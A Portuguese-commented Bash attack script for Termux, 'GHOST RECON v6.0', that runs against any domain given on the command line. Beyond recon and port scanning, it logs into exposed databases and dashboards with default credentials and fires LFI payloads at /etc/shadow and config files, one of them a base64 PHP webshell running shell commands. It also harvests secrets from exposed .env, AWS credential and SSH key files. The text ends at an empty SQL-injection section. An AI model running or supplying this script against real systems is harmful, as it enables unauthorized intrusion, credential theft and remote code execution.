#!/data/data/com.termux/files/usr/bin/bash
# GHOST RECON v6.0 - Ultimate Scanner
# Uso: bash recon.sh alvo.com

TARGET="${1:-}"
[ -z "$TARGET" ] && read -p "Alvo: " TARGET
DOMAIN=$(echo "$TARGET" | sed 's~https\?://~~;s~www\.~~;s~/.*~~' | tr '[:upper:]' '[:lower:]' | tr -d ' ')
URL="https://$DOMAIN"
LOG="$HOME/recon_${DOMAIN}_$(date +%Y%m%d_%H%M%S).log"
VULN=0
declare -a VULN_LIST ADMIN_PANELS DB_EXPOSED FILES_EXPOSED

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'
W='\033[1;37m'; N='\033[0m'; B='\033[1m'

_log(){ echo "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$LOG" 2>/dev/null; }
v(){ ((VULN++)); VULN_LIST+=("$1"); echo -e "${R}[VULN]${N} $1" | tee -a "$LOG"; }
i(){ echo -e "${G}[+]${N} $1" | tee -a "$LOG"; }
w(){ echo -e "${Y}[!]${N} $1" | tee -a "$LOG"; }
s(){ echo -e "  ${C}>${N} $1" | tee -a "$LOG"; }
t(){ echo -e "\n${W}${B}=== $1 ===${N}" | tee -a "$LOG"; }
adm(){ ADMIN_PANELS+=("$1"); v "PAINEL ADM ABERTO: $1"; }
dbx(){ DB_EXPOSED+=("$1"); v "DB EXPOSTO: $1"; }
fex(){ FILES_EXPOSED+=("$1"); v "ARQUIVO EXPOSTO: $1"; }

for dep in curl dig nmap host whois traceroute python3 openssl nc; do
  command -v "$dep" &>/dev/null || pkg install "$dep" -y &>/dev/null 2>&1
done

IPV4=$(dig +short "$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
IP=$(echo "$IPV4" | head -1)
IPV6=$(dig +short "$DOMAIN" AAAA 2>/dev/null | head -1)
[ -z "$IP" ] && IP=$(host "$DOMAIN" 2>/dev/null | awk '/has address/{print $NF}' | head -1)
[ -z "$IP" ] && echo "Nao resolveu $DOMAIN" && exit 1

echo "GHOST RECON v6.0 - $DOMAIN - $(date)" | tee "$LOG"
echo "IP: $IP | Log: $LOG" | tee -a "$LOG"
echo "========================================" >> "$LOG"
i "IP: $IP | IPv6: ${IPV6:-n/a}"
echo "$IPV4" | tail -n +2 | while read xip; do [ -n "$xip" ] && s "IPv4 extra: $xip"; done
[ "$(echo "$IPV4" | wc -l)" -gt 1 ] && w "Multiplos IPs detectados — possivel CDN/LB"

t "GEOIP"
GEO=$(curl -s --max-time 6 "http://ip-api.com/json/$IP?fields=country,countryCode,regionName,city,zip,isp,org,as,proxy,hosting,lat,lon" 2>/dev/null)
s "Pais:   $(echo $GEO|grep -o '"country":"[^"]*"'|cut -d'"' -f4) ($(echo $GEO|grep -o '"countryCode":"[^"]*"'|cut -d'"' -f4))"
s "Estado: $(echo $GEO|grep -o '"regionName":"[^"]*"'|cut -d'"' -f4)"
s "Cidade: $(echo $GEO|grep -o '"city":"[^"]*"'|cut -d'"' -f4)"
s "ISP:    $(echo $GEO|grep -o '"isp":"[^"]*"'|cut -d'"' -f4)"
s "Org:    $(echo $GEO|grep -o '"org":"[^"]*"'|cut -d'"' -f4)"
s "AS:     $(echo $GEO|grep -o '"as":"[^"]*"'|cut -d'"' -f4)"
LAT=$(echo $GEO|grep -o '"lat":[^,}]*'|cut -d: -f2)
LON=$(echo $GEO|grep -o '"lon":[^,}]*'|cut -d: -f2)
[ -n "$LAT" ] && s "Maps: https://maps.google.com/?q=$LAT,$LON"
echo $GEO|grep -o '"proxy":true' &>/dev/null && v "PROXY/VPN detectado em $IP"
echo $GEO|grep -o '"hosting":true' &>/dev/null && w "Datacenter/Hosting"
for xip in $(echo "$IPV4" | tail -n +2); do
  [ -z "$xip" ] && continue
  XG=$(curl -s --max-time 4 "http://ip-api.com/json/$xip?fields=country,city,isp" 2>/dev/null)
  s "GEO $xip: $(echo $XG|grep -o '"country":"[^"]*"'|cut -d'"' -f4)/$(echo $XG|grep -o '"city":"[^"]*"'|cut -d'"' -f4)/$(echo $XG|grep -o '"isp":"[^"]*"'|cut -d'"' -f4)"
done

t "DNS COMPLETO"
for TYPE in A AAAA MX NS TXT CNAME SOA CAA SRV; do
  R=$(dig +short "$DOMAIN" $TYPE 2>/dev/null)
  [ -n "$R" ] && i "[$TYPE]" && echo "$R" | while read r; do [ -n "$r" ] && s "$r"; done
done
dig +short "$DOMAIN" NS 2>/dev/null | while read ns; do
  AX=$(dig axfr "$DOMAIN" @"$ns" 2>/dev/null)
  echo "$AX" | grep -qv "failed\|refused\|NOTAUTH\|Transfer" && v "ZONE TRANSFER via $ns!" && echo "$AX" | head -25 | while read l; do s "$l"; done
done

t "WHOIS"
whois "$DOMAIN" 2>/dev/null | grep -iE "registrar|creation|expir|name.?server|registrant|email|country|dnssec|abuse" | sort -u | head -12 | while read l; do s "$l"; done
whois "$IP" 2>/dev/null | grep -iE "netname|country|org|cidr|inetnum|abuse|route" | sort -u | head -8 | while read l; do s "$l"; done

t "IP REAL / BYPASS CDN"
HDR=$(curl -sI --max-time 8 "$URL" 2>/dev/null)
echo "$HDR" | grep -qi "cloudflare" && w "CDN: Cloudflare detectado"
echo "$HDR" | grep -qi "x-amz\|cloudfront" && w "CDN: AWS CloudFront"
echo "$HDR" | grep -qi "fastly" && w "CDN: Fastly"
echo "$HDR" | grep -qi "sucuri\|incapsula\|imperva" && w "WAF detectado"
for sub in mail ftp smtp pop imap webmail cpanel whm api api2 dev dev2 stage staging test beta admin portal cdn ns1 ns2 vpn remote direct; do
  SIP=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
  [ -n "$SIP" ] && [ "$SIP" != "$IP" ] && v "IP REAL possivel em $sub.$DOMAIN -> $SIP"
done
dig +short "$DOMAIN" TXT 2>/dev/null | grep -oE 'ip4:[^ "]+|ip6:[^ "]+' | while read ipx; do v "SPF IP leak: $ipx"; done
dig +short "$DOMAIN" MX 2>/dev/null | awk '{print $2}' | while read mx; do
  MXI=$(dig +short "$mx" A 2>/dev/null | head -1)
  [ -n "$MXI" ] && [ "$MXI" != "$IP" ] && v "MX IP diferente: $mx -> $MXI"
done
i "crt.sh lookup..."
curl -s --max-time 12 "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
  python3 -c "
import sys,json
try:
  seen=set()
  for e in json.load(sys.stdin):
    for n in e.get('name_value','').split('\n'):
      n=n.strip().replace('*.','')
      if '$DOMAIN' in n and n not in seen:
        seen.add(n); print(n)
except: pass
" 2>/dev/null | sort | while read sub; do
  SIP=$(dig +short "$sub" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
  [ -n "$SIP" ] && s "crt.sh: $sub -> $SIP"
done

t "HTTP HEADERS + TECNOLOGIAS"
echo "$HDR" | grep -iE "^server:|^x-powered-by:|^x-generator:|^x-cms:|^via:|^x-cache:|^x-varnish:|^x-drupal|^x-wp" | while read l; do s "$l"; done
PAGE=$(curl -sk --max-time 12 "$URL" 2>/dev/null)
HTTP_CODE=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)
TITLE=$(echo "$PAGE" | grep -oi '<title>[^<]*</title>' | sed 's/<[^>]*>//g' | head -1)
s "HTTP: $HTTP_CODE | Title: $TITLE"
echo "$PAGE$HDR" | grep -qi "wp-content\|wordpress" && i "CMS: WordPress"
echo "$PAGE$HDR" | grep -qi "joomla" && i "CMS: Joomla"
echo "$PAGE$HDR" | grep -qi "drupal" && i "CMS: Drupal"
echo "$PAGE$HDR" | grep -qi "magento" && i "Ecommerce: Magento"
echo "$PAGE$HDR" | grep -qi "shopify" && i "Ecommerce: Shopify"
echo "$HDR" | grep -qi "server: nginx" && i "Servidor: NGINX"
echo "$HDR" | grep -qi "server: apache" && i "Servidor: Apache"
echo "$HDR" | grep -qi "server: iis" && i "Servidor: IIS"
echo "$PAGE" | grep -qi "react\|__react" && i "Frontend: React"
echo "$PAGE" | grep -qi "vue\b\|__vue__" && i "Frontend: Vue.js"
echo "$PAGE" | grep -qi "angular\|ng-version" && i "Frontend: Angular"
echo "$PAGE" | grep -qi "laravel_session" && i "Framework: Laravel"
echo "$PAGE" | grep -qi "swagger-ui\|swagger.json\|openapi" && w "Swagger/API Docs exposta"
echo "$PAGE" | grep -qi "graphql" && w "GraphQL detectado"
echo "$HDR" | grep -qi "Strict-Transport-Security" || w "HSTS ausente"
echo "$HDR" | grep -qi "X-Frame-Options" || w "X-Frame-Options ausente"
echo "$HDR" | grep -qi "Content-Security-Policy" || w "CSP ausente"

t "SSL/TLS"
CERT_RAW=$(echo | timeout 8 openssl s_client -connect "$DOMAIN:443" -servername "$DOMAIN" 2>/dev/null)
CERT=$(echo "$CERT_RAW" | openssl x509 -noout -text 2>/dev/null)
if [ -n "$CERT" ]; then
  echo "$CERT_RAW" | openssl x509 -noout -subject -issuer -dates 2>/dev/null | while read l; do s "$l"; done
  SANS=$(echo "$CERT" | grep -A3 "Subject Alternative Name" | grep -oE "DNS:[^,\n]*|IP Address:[^,\n]*")
  [ -n "$SANS" ] && i "SANs:" && echo "$SANS" | while read sx; do s "$sx"; done
  for proto in ssl3 tls1 tls1_1; do
    echo | timeout 3 openssl s_client -connect "$DOMAIN:443" -$proto 2>&1 | grep -qi "Cipher\|handshake" && v "Protocolo inseguro ativo: $proto"
  done
else
  w "SSL nao disponivel"
fi

t "NMAP PORT SCAN"
i "Escaneando portas em $IP..."
nmap -sV --open -T4 --min-rate 3000 \
  -p 21,22,23,25,53,80,110,143,443,445,465,587,993,995,\
1433,1521,2181,2375,2376,2379,2380,\
3000,3306,3307,3389,4369,4848,\
5000,5432,5433,5601,5672,5984,\
6379,6432,6443,7000,7474,7687,\
8080,8081,8086,8088,8123,8443,8888,8983,\
9000,9042,9090,9200,9300,9418,\
11211,15672,19000,27017,27018,28015,33060,50000 \
"$IP" 2>/dev/null | grep "open" | while read line; do
  s "PORT: $line"
done

t "PAINEIS ADM / LOGIN / CONTROLE"
i "Testando paineis de administracao (paralelo)..."

ADM_PATHS=(
  admin admin/ administrator administrator/
  login login/ signin sign-in/ auth/
  dashboard dashboard/ panel panel/ control control/
  backend/ manage/ manager/
  cp/ controlpanel/ admincp/
  phpmyadmin phpmyadmin/ PMA/ pma/ pma/index.php
  adminer adminer.php db/adminer.php
  pgadmin pgadmin/ pgadmin4/ pgadmin4/browser/
  phpredisadmin/ redis-admin/ redis-commander/
  mongo-express/
  cpanel/ whm/ plesk/ webmin/ directadmin/
  wp-admin/ wp-login.php
  administrator/ user/login
  grafana/ grafana/login
  kibana/ app/kibana
  prometheus/ prometheus/graph
  portainer/ portainer/#/
  rancher/ rancher/login
  netdata/
  zabbix/ zabbix/index.php
  nagios/ nagios/cgi-bin/
  cacti/ cacti/index.php
  jenkins/ jenkins/login
  gitlab/ gitlab/users/sign_in
  gitea/ gogs/
  sonarqube/ sonar/
  nexus/ nexus/#browse/
  roundcube/ webmail/ squirrelmail/
  swagger-ui/ swagger/ api-docs/ api/docs/
  redoc/ openapi.json swagger.json
  solr/ solr/#/
  actuator/ actuator/env actuator/health
  server-status server-info nginx_status
  console/ cgi-bin/ manager/html
  jmx-console/ web-console/ admin-console/
  elmah.axd trace.axd
  install/ setup/ setup.php install.php
  h2-console/ h2/ dbconsole/
  superset/ metabase/ redash/
  jupyter/ notebook/
)

for path in "${ADM_PATHS[@]}"; do
  (
  for HOST in "$DOMAIN" "$IP"; do
    for proto in https http; do
      for PORT in "" ":8080" ":8443" ":8888" ":9090" ":3000" ":4000" ":9000" ":5000" ":7000"; do
        TURL="$proto://$HOST$PORT/$path"
        CODE=$(curl -sk --max-time 3 -o /tmp/adm_$$ -w "%{http_code}" -L "$TURL" 2>/dev/null)
        case "$CODE" in
          200)
            SZ=$(wc -c < /tmp/adm_$$ 2>/dev/null || echo 0)
            BODY=$(cat /tmp/adm_$$ 2>/dev/null | head -c 500)
            if echo "$BODY" | grep -qiE "login|password|username|admin|dashboard|sign.?in|authenticate|panel|console|phpmyadmin|grafana|kibana|jenkins"; then
              adm "$TURL"
            elif [ "$SZ" -gt 500 ]; then
              w "Pagina acessivel (possivel painel): $TURL"
            fi
            ;;
          401) v "Painel com AUTH ($CODE): $TURL" ;;
          403) s "Forbidden ($CODE): $TURL" ;;
        esac
        rm -f /tmp/adm_$$ 2>/dev/null
      done
    done
  done
  ) &
  [ $(jobs -r | wc -l) -ge 50 ] && wait
done
wait

t "DATABASE PORTS + EXPLOIT"

declare -A DBPORTS=(
  [3306]="MySQL" [3307]="MySQL-Alt" [33060]="MySQL-X"
  [5432]="PostgreSQL" [5433]="PG-Alt" [6432]="PgBouncer"
  [27017]="MongoDB" [27018]="MongoDB-2" [27019]="MongoDB-3"
  [6379]="Redis" [6380]="Redis-TLS"
  [9200]="Elasticsearch" [9300]="ES-Transport"
  [5984]="CouchDB" [4000]="CouchDB-Alt"
  [8529]="ArangoDB" [7474]="Neo4j-HTTP" [7687]="Neo4j-Bolt"
  [9042]="Cassandra" [7000]="Cassandra-2"
  [2181]="Zookeeper"
  [11211]="Memcached"
  [15672]="RabbitMQ-Mgmt" [5672]="RabbitMQ-AMQP"
  [1433]="MSSQL" [1521]="Oracle" [50000]="DB2"
  [8086]="InfluxDB"
  [28015]="RethinkDB"
  [8983]="Apache-Solr"
  [9090]="Prometheus"
  [3000]="Grafana"
  [5601]="Kibana"
  [8123]="ClickHouse" [19000]="ClickHouse-TCP"
  [2379]="etcd" [2380]="etcd-Peer"
  [2375]="Docker-API"
)

for port in $(echo "${!DBPORTS[@]}" | tr ' ' '\n' | sort -n); do
  SVC="${DBPORTS[$port]}"
  (
  OPEN=$(timeout 1 bash -c "echo '' > /dev/tcp/$IP/$port" 2>/dev/null && echo "OPEN")
  [ "$OPEN" != "OPEN" ] && exit

  dbx "$SVC em $IP:$port"

  case "$port" in
    3306|3307|33060)
      BNR=$(timeout 2 bash -c "cat < /dev/tcp/$IP/$port 2>/dev/null" | strings 2>/dev/null | head -c 150)
      [ -n "$BNR" ] && s "MySQL Banner: $BNR"
      s "Acesso direto:  mysql://$IP:$port"
      s "phpMyAdmin:     http://$DOMAIN/phpmyadmin | http://$IP:8080/phpmyadmin"
      s "Adminer:        http://$DOMAIN/adminer | http://$DOMAIN/adminer.php"
      s "MySQL Workbench: mysql://root@$IP:$port"
      if command -v mysql &>/dev/null; then
        RES=$(timeout 4 mysql -h "$IP" -P "$port" -u root --password= -e "show databases;" 2>&1)
        echo "$RES" | grep -qi "Database\|mysql\|schema" && v "MySQL root SEM SENHA! $IP:$port" && echo "$RES" | head -10 | while read l; do s "$l"; done
      fi
      ;;
    5432|5433|6432)
      s "Acesso direto:  postgresql://$IP:$port"
      s "pgAdmin 4:      http://$IP:5050 | http://$DOMAIN/pgadmin4"
      s "Adminer:        http://$DOMAIN/adminer.php?server=$IP"
      ;;
    27017|27018|27019)
      s "Acesso direto: mongodb://$IP:$port"
      HTTP=$(curl -s --max-time 4 "http://$IP:28017/" 2>/dev/null)
      echo "$HTTP" | grep -qi "mongo\|listing\|database" && {
        v "MongoDB HTTP interface aberta!"
        s "Listar DBs:  http://$IP:28017/listDatabases"
        s "Status:      http://$IP:28017/serverStatus"
        s "Admin:       http://$IP:28017/_replSet"
      }
      ;;
    6379|6380)
      PONG=$(printf "*1\r\n\$4\r\nPING\r\n" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null)
      if echo "$PONG" | grep -qi "PONG"; then
        v "Redis SEM SENHA em $IP:$port"
        s "URL: redis://$IP:$port"
        INFO=$(printf "*1\r\n\$4\r\nINFO\r\n" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null | grep -E "redis_version|os:|role:|connected_clients" | head -4)
        echo "$INFO" | while read l; do s "$l"; done
        DIR=$(printf "*3\r\n\$6\r\nCONFIG\r\n\$3\r\nGET\r\n\$3\r\ndir\r\n" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null | strings | tail -1)
        [ -n "$DIR" ] && s "Redis dir: $DIR"
      fi
      ;;
    9200|9300)
      ES=$(curl -s --max-time 5 "http://$IP:9200/" 2>/dev/null)
      if echo "$ES" | grep -qi "cluster_name\|version\|elasticsearch"; then
        v "Elasticsearch SEM AUTH em $IP:9200"
        CLUSTER=$(echo "$ES" | grep -o '"cluster_name":"[^"]*"' | cut -d'"' -f4)
        ESVER=$(echo "$ES" | grep -o '"number":"[^"]*"' | cut -d'"' -f4)
        s "Cluster: $CLUSTER | Versao: $ESVER"
        s "Indices:  http://$IP:9200/_cat/indices?v"
        s "Nodes:    http://$IP:9200/_cat/nodes?v"
        s "All data: http://$IP:9200/_all/_search?pretty"
        s "Mappings: http://$IP:9200/_all/_mapping?pretty"
        s "Cluster:  http://$IP:9200/_cluster/health?pretty"
        IDX=$(curl -s --max-time 4 "http://$IP:9200/_cat/indices?v" 2>/dev/null | head -5)
        [ -n "$IDX" ] && s "Indices: $IDX"
        adm "http://$IP:9200"
      fi
      ;;
    5984|4000)
      DBS=$(curl -s --max-time 4 "http://$IP:$port/_all_dbs" 2>/dev/null)
      echo "$DBS" | grep -q "\[" && {
        v "CouchDB SEM AUTH em $IP:$port"
        s "Databases: http://$IP:$port/_all_dbs -> $DBS"
        s "Admin UI:  http://$IP:$port/_utils"
        s "Config:    http://$IP:$port/_config"
        adm "http://$IP:$port/_utils"
      }
      ;;
    11211)
      STATS=$(echo "stats" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null | head -5)
      [ -n "$STATS" ] && {
        v "Memcached SEM AUTH em $IP:$port (risco DDoS amplification)"
        echo "$STATS" | head -3 | while read l; do s "$l"; done
      }
      ;;
    5601)
      KIB=$(curl -s --max-time 5 "http://$IP:5601/api/status" 2>/dev/null)
      echo "$KIB" | grep -qi "kibana\|version" && {
        v "Kibana SEM AUTH em $IP:5601"
        s "Dashboard:  http://$IP:5601/app/kibana"
        s "Status:     http://$IP:5601/api/status"
        s "Discover:   http://$IP:5601/app/discover"
        s "Dev Tools:  http://$IP:5601/app/dev_tools"
        adm "http://$IP:5601/app/kibana"
      }
      ;;
    3000)
      GRAF=$(curl -s --max-time 4 "http://$IP:3000/api/health" 2>/dev/null)
      echo "$GRAF" | grep -qi "ok" && {
        GAUTH=$(curl -s --max-time 4 -u "admin:admin" "http://$IP:3000/api/org" 2>/dev/null)
        if echo "$GAUTH" | grep -qi '"id"'; then
          v "Grafana admin:admin FUNCIONOU! http://$IP:3000"
          adm "http://$IP:3000 (admin:admin)"
          s "Dashboards: http://$IP:3000/api/dashboards/home"
          s "Users:      http://$IP:3000/api/users"
          s "Data srcs:  http://$IP:3000/api/datasources"
        else
          adm "http://$IP:3000 (requer auth)"
        fi
      }
      ;;
    9090)
      P=$(curl -s --max-time 4 "http://$IP:9090/-/healthy" 2>/dev/null)
      echo "$P" | grep -qi "Healthy\|OK" && {
        v "Prometheus SEM AUTH em $IP:9090"
        adm "http://$IP:9090/graph"
        s "Metrics:  http://$IP:9090/metrics"
        s "Targets:  http://$IP:9090/api/v1/targets"
        s "Alerts:   http://$IP:9090/api/v1/alerts"
        s "Config:   http://$IP:9090/api/v1/status/config"
      }
      ;;
    8086)
      PC=$(curl -s --max-time 4 -o /dev/null -w "%{http_code}" "http://$IP:8086/ping" 2>/dev/null)
      [ "$PC" = "204" ] && {
        v "InfluxDB SEM AUTH em $IP:8086"
        DBS=$(curl -s --max-time 4 "http://$IP:8086/query?q=SHOW%20DATABASES" 2>/dev/null)
        [ -n "$DBS" ] && s "Databases: $DBS"
        s "Query: http://$IP:8086/query?q=SHOW+DATABASES"
      }
      ;;
    8123)
      CH=$(curl -s --max-time 4 "http://$IP:8123/?query=SELECT+1" 2>/dev/null)
      [ "$CH" = "1" ] && {
        v "ClickHouse SEM AUTH em $IP:8123"
        DBS=$(curl -s --max-time 4 "http://$IP:8123/?query=SHOW+DATABASES" 2>/dev/null)
        s "Databases: $DBS"
        s "Play UI:   http://$IP:8123/play"
        adm "http://$IP:8123/play"
      }
      ;;
    2379)
      ET=$(curl -s --max-time 4 "http://$IP:2379/v3/cluster/member/list" 2>/dev/null)
      echo "$ET" | grep -qi "members\|header" && {
        v "etcd SEM AUTH em $IP:2379 (Kubernetes secrets!)"
        s "Members: http://$IP:2379/v3/cluster/member/list"
        s "Keys:    http://$IP:2379/v2/keys/"
        s "Health:  http://$IP:2379/health"
      }
      ;;
    2181)
      ZK=$(echo "ruok" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null)
      [ "$ZK" = "imok" ] && {
        v "Zookeeper SEM AUTH em $IP:$port"
        ZKST=$(echo "stat" | timeout 3 nc -w 2 "$IP" "$port" 2>/dev/null | head -5)
        echo "$ZKST" | while read l; do s "$l"; done
      }
      ;;
    15672)
      RB=$(curl -s --max-time 4 -u "guest:guest" "http://$IP:15672/api/overview" 2>/dev/null)
      echo "$RB" | grep -qi "rabbitmq_version" && {
        v "RabbitMQ guest:guest OK em $IP:15672"
        adm "http://$IP:15672 (guest:guest)"
        RBVER=$(echo "$RB" | grep -o '"rabbitmq_version":"[^"]*"' | cut -d'"' -f4)
        s "Versao: $RBVER"
        s "Queues:    http://$IP:15672/api/queues"
        s "Exchanges: http://$IP:15672/api/exchanges"
        s "Users:     http://$IP:15672/api/users"
      }
      ;;
    8983)
      SOLR=$(curl -s --max-time 4 "http://$IP:8983/solr/admin/info/system?wt=json" 2>/dev/null)
      echo "$SOLR" | grep -qi "solr_spec_version" && {
        v "Apache Solr SEM AUTH em $IP:8983"
        adm "http://$IP:8983/solr"
        s "Cores:   http://$IP:8983/solr/admin/cores?action=STATUS&wt=json"
      }
      ;;
    1433|1434)
      v "MSSQL exposto em $IP:$port"
      s "Report Server: http://$DOMAIN/reportserver"
      s "SSRS Reports:  http://$DOMAIN/reports"
      s "URL: mssql://$IP:$port"
      ;;
    1521)
      v "Oracle DB exposto em $IP:$port"
      s "URL: oracle://$IP:$port"
      ;;
    7474)
      NEO=$(curl -s --max-time 4 "http://$IP:7474/" 2>/dev/null)
      echo "$NEO" | grep -qi "neo4j\|bolt" && {
        v "Neo4j exposto em $IP:7474"
        adm "http://$IP:7474/browser/"
        NA=$(curl -s --max-time 4 -u "neo4j:neo4j" "http://$IP:7474/db/data/" 2>/dev/null)
        echo "$NA" | grep -qi "neo4j_version" && v "Neo4j neo4j:neo4j OK!"
      }
      ;;
    2375|2376)
      DOCK=$(curl -s --max-time 4 "http://$IP:2375/version" 2>/dev/null)
      echo "$DOCK" | grep -qi "Version\|ApiVersion" && {
        v "Docker API SEM AUTH em $IP:2375 — CRITICO!"
        s "Containers: http://$IP:2375/containers/json"
        s "Images:     http://$IP:2375/images/json"
        s "Info:       http://$IP:2375/info"
        CTNR=$(curl -s --max-time 4 "http://$IP:2375/containers/json" 2>/dev/null | python3 -c "import sys,json; [print(c.get('Image','?'),c.get('Status','?')) for c in json.load(sys.stdin)]" 2>/dev/null | head -5)
        [ -n "$CTNR" ] && s "Containers: $CTNR"
        adm "http://$IP:2375/containers/json"
      }
      ;;
    8529)
      ARA=$(curl -s --max-time 4 "http://$IP:8529/_api/version" 2>/dev/null)
      echo "$ARA" | grep -qi "version\|arangodb" && {
        v "ArangoDB exposto em $IP:8529"
        adm "http://$IP:8529/_db/_system/_admin/aardvark/index.html"
      }
      ;;
  esac
  ) &
  [ $(jobs -r | wc -l) -ge 30 ] && wait
done
wait

t "ARQUIVO VULNERAVEL / LFI / BACKUP / CONFIG"
i "LFI scan..."
LFI_PAYLOADS=(
  "../../../../../../etc/passwd"
  "../../../../../../etc/shadow"
  "../../../../../../proc/self/environ"
  "../../../../../../var/log/apache2/access.log"
  "../../../../../../var/log/nginx/access.log"
  "../../../../../../etc/mysql/my.cnf"
  "../../../../../../etc/php.ini"
  "../../../../windows/win.ini"
  "php://filter/convert.base64-encode/resource=/etc/passwd"
  "php://filter/read=convert.base64-encode/resource=config.php"
  "php://filter/read=convert.base64-encode/resource=../config.php"
  "php://filter/read=convert.base64-encode/resource=wp-config.php"
  "expect://id"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "....//....//....//etc//passwd"
  "/etc/passwd%00"
  "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
)
LFI_PARAMS=(file page path include template doc view lang module read source load f p pg)
for param in "${LFI_PARAMS[@]}"; do
  for payload in "${LFI_PAYLOADS[@]}"; do
    (
    ENC=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
    R=$(curl -sk --max-time 5 "$URL/?$param=$ENC" 2>/dev/null)
    if echo "$R" | grep -qiE "root:.*:0:|bin:/bin|\[extensions\]|\[boot loader\]|PHP Version|configuration.nix"; then
      v "LFI em ?$param= | $URL/?$param=$ENC"
      echo "$R" | grep -E "root:|bin:|daemon:|www-data:" | head -3 | while read l; do s "$l"; done
    fi
    ) &
    [ $(jobs -r | wc -l) -ge 40 ] && wait
  done
done
wait

i "Sensitive files scan..."
SENSITIVE_FILES=(
  .env .env.local .env.production .env.development .env.staging .env.backup .env.old .env.bak
  config.php config.php.bak config.php~ wp-config.php wp-config.php.bak wp-config.php~
  wp-config.php.old wp-config.php.save settings.php database.php db.php connection.php
  .git/config .git/HEAD .git/COMMIT_EDITMSG .git/logs/HEAD .git/packed-refs
  .svn/entries .svn/wc.db .htpasswd .htaccess .bash_history .ssh/id_rsa id_rsa
  phpinfo.php info.php test.php debug.php php.php shell.php cmd.php webshell.php
  backup.zip backup.tar.gz backup.sql site.zip database.sql dump.sql mysql.sql
  docker-compose.yml docker-compose.yaml .dockerenv
  composer.json composer.lock package.json
  error.log error_log access.log debug.log app.log application.log
  storage/logs/laravel.log wp-content/debug.log nohup.out
  config.yml config.yaml config.json secrets.json appsettings.json web.config
  application.properties application.yml settings.py local_settings.py
  config/database.yml config/secrets.yml config/master.key
  .aws/credentials credentials.json service-account.json
  .travis.yml Jenkinsfile .gitlab-ci.yml
  server.key private.key ssl.key domain.key
  adminer.php phpmyadmin/ pma/
  Thumbs.db .DS_Store robots.txt sitemap.xml
  crossdomain.xml clientaccesspolicy.xml
  README.md CHANGELOG.md INSTALL.md TODO.md
  includes/config.php inc/config.php src/config.php app/config.php
  sites/default/settings.php
)
for f in "${SENSITIVE_FILES[@]}"; do
  (
  CODE=$(curl -sk --max-time 4 -o /tmp/sf_$$ -w "%{http_code}" "$URL/$f" 2>/dev/null)
  if [ "$CODE" = "200" ]; then
    SZ=$(wc -c < /tmp/sf_$$ 2>/dev/null || echo 0)
    if [ "$SZ" -gt 50 ]; then
      CONT=$(cat /tmp/sf_$$ 2>/dev/null | head -c 600)
      if echo "$CONT" | grep -qiE "password|passwd|secret|api_key|token|database|DB_|mysql|redis|mongo|HOST|connect|auth|credential|private|aws|AKIA|sk_live|-----BEGIN|jdbc:|mongodb://|redis://|DB_PASSWORD|DB_USER|DB_HOST"; then
        fex "$URL/$f ($SZ bytes)"
        echo "$CONT" | grep -iE "password|passwd|secret|api_key|token|DB_|AKIA|sk_live" | head -4 | while read l; do s "  $l"; done
      elif echo "$f" | grep -qiE "backup|\.zip|\.sql|\.tar|dump|\.bak"; then
        fex "$URL/$f ($SZ bytes — arquivo backup!)"
      else
        w "Acessivel ($SZ bytes): $URL/$f"
      fi
    fi
  fi
  rm -f /tmp/sf_$$ 2>/dev/null
  ) &
  [ $(jobs -r | wc -l) -ge 60 ] && wait
done
wait

GIT=$(curl -sk --max-time 5 "$URL/.git/config" 2>/dev/null)
if echo "$GIT" | grep -qi "\[core\]\|\[remote\]"; then
  v ".git EXPOSTO: $URL/.git/config"
  fex "$URL/.git/config"
  s "HEAD:   $URL/.git/HEAD"
  s "Log:    $URL/.git/logs/HEAD"
  REM=$(echo "$GIT" | grep "url = " | head -1 | xargs)
  [ -n "$REM" ] && s "Remote: $REM"
fi

t "DIRECTORY BRUTE FORCE"
DIRS=(
  api api/v1 api/v2 api/v3 rest/api graphql
  swagger swagger-ui swagger.json openapi.json api-docs redoc
  phpinfo.php info.php test.php debug.php
  actuator actuator/env actuator/health actuator/beans actuator/mappings
  server-status server-info nginx_status php-fpm-status
  uploads upload files media img images static assets content
  backup backups bkp bak old archive tmp temp cache storage
  sitemap.xml robots.txt security.txt .well-known/security.txt
  cgi-bin cgi scripts perl bin
  WEB-INF/ META-INF/ web.xml
  wp-content/uploads wp-json wp-json/wp/v2/users xmlrpc.php wp-cron.php
  vendor node_modules bower_components
  .env .git .svn docker-compose.yml Dockerfile
  dev staging test uat qa prod beta
)
for dir in "${DIRS[@]}"; do
  (
  CODE=$(curl -sk --max-time 4 -o /tmp/dir_$$ -w "%{http_code}" "$URL/$dir" 2>/dev/null)
  SZ=$(wc -c < /tmp/dir_$$ 2>/dev/null || echo 0)
  case "$CODE" in
    200) [ "$SZ" -gt 100 ] && v "DIR acessivel ($CODE, ${SZ}b): $URL/$dir" ;;
    301|302) s "Redirect ($CODE): $URL/$dir" ;;
    401) s "Auth required ($CODE): $URL/$dir" ;;
    403) s "Forbidden ($CODE): $URL/$dir" ;;
  esac
  rm -f /tmp/dir_$$ 2>/dev/null
  ) &
  [ $(jobs -r | wc -l) -ge 50 ] && wait
done
wait

t "SQL INJECTION"
